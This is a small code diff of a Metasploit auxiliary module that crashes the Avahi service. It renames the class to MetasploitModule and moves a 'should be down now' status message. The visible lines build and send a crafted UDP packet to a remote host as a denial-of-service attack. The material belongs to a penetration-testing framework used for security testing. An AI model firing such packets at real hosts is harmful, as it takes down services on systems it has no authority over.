@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Capture
   include Msf::Auxiliary::Dos
@@ -45,10 +45,7 @@ class Metasploit3 < Msf::Auxiliary
     p.udp_dport = datastore['RPORT'].to_i
     p.payload = Rex::Text.rand_text(rand(0x20)) # UDP needs at least one data byte, may as well send a few.
     p.recalc
-    capture_sendto(p, rhost)
-
+    capture_sendto(p, rhost) and print_status("Avahi should be down now")
     close_pcap
-
-    print_status("Avahi should be down now")
   end
 end
